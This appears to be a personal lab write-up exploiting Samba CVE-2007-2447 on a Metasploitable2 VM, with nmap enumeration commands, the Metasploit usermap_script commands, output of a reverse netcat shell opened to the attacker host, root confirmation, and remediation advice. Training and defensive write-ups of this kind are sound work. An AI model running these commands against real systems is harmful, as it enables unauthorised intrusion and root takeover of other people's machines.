# Metasploitable2 — Samba "username map script" RCE (CVE-2007-2447)

**Target:** 192.168.109.131 (Metasploitable2, isolated lab VM)
**Attacker host:** Kali Linux, 192.168.109.141
**Environment:** Personal, isolated virtual lab — authorized self-practice only

---

## 1. Objective

Enumerate SMB/Samba services on the target, identify the exact
version and any exposed shares or misconfigurations, and exploit a
known unauthenticated command execution vulnerability to obtain root
access.

## 2. Scope

- Service/version detection on SMB ports (139, 445)
- Share and user enumeration via Nmap NSE scripts
- Exploitation via Metasploit
- Verification of access level obtained

## 3. Tools Used

Nmap, Metasploit Framework (msfconsole)

## 4. Methodology

1. Port/version scan of SMB services
2. Deep enumeration — OS discovery, share enumeration, user enumeration
3. Vulnerability identification from the confirmed Samba version
4. Exploitation via Metasploit
5. Post-exploitation verification

## 5. Reconnaissance

### Command
```
nmap -sV -p 139,445 192.168.109.131
```

### Result
```
PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

Initial banner detection only narrows the version to a range —
deeper enumeration was required to confirm the exact build.

### Command
```
nmap --script smb-os-discovery,smb-enum-shares,smb-enum-users -p 445 192.168.109.131
```

### Key Results

**Exact version confirmed:**
```
OS: Unix (Samba 3.0.20-Debian)
Computer name: metasploitable
FQDN: metasploitable.localdomain
```

**Misconfigured shares — anonymous READ/WRITE access:**
```
\\192.168.109.131\IPC$   Anonymous access: READ/WRITE
\\192.168.109.131\tmp    Anonymous access: READ/WRITE
```

**Enumerated user accounts:** ~30 local accounts discovered, all but
two (`msfadmin`, `user`) disabled — reduces the credential attack
surface to two accounts for any future brute-force/spray attempt.

## 6. Observations

- Samba 3.0.20-Debian is vulnerable to CVE-2007-2447, a
  pre-authentication remote command execution flaw
- Two shares (`IPC$`, `tmp`) allow fully unauthenticated read/write
  access — an independent finding worth remediation regardless of
  the RCE vulnerability
- Only two live (non-disabled) user accounts exist, narrowing future
  credential-based attack surface

## 7. Risk Review

- The "username map script" misconfiguration allows unauthenticated
  remote code execution with no valid credentials required
- Anonymous write access to shares could allow malware/backdoor
  staging without any authentication
- Successful exploitation grants full root access to the host

## 8. Exploitation

### Vulnerability
**Samba "username map script" Command Execution** — CVE-2007-2447.
Affects Samba 3.0.20 through 3.0.25rc3 when the non-default
`username map script` option is enabled. Because usernames are
passed to this script *before* authentication occurs, shell
metacharacters in the username field allow arbitrary command
execution with no valid credentials.

### Module Used
```
msf > search usermap_script
msf > use exploit/multi/samba/usermap_script
msf exploit(multi/samba/usermap_script) > set RHOSTS 192.168.109.131
msf exploit(multi/samba/usermap_script) > run
```

### Result
```
[*] Started reverse TCP handler on 192.168.109.141:4444
[*] Command shell session 1 opened (192.168.109.141:4444 -> 192.168.109.131:49490)
```

A plain command shell was returned (payload: `cmd/unix/reverse_netcat`),
not a meterpreter session — standard Linux commands work directly.

## 9. Proof of Access

```
whoami
root

ip addr
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.109.131/24 brd 192.168.109.255 scope global eth0
```

Root access confirmed directly via `whoami`, with `ip addr` verifying
the shell is running on the target host itself.

## 10. Recommendation

- Disable the `username map script` option unless explicitly required;
  if required, restrict and sanitize its input rigorously
- Upgrade Samba to a current, patched release
- Disable anonymous access on the `IPC$` and `tmp` shares; require
  authentication for all share access
- Disable or remove unused local accounts entirely rather than merely
  marking them disabled
- Apply network segmentation so SMB is not exposed beyond what is
  operationally necessary

---

*This assessment was performed entirely within a personal, isolated
lab environment (Metasploitable2 + Kali Linux) for self-training
purposes.*
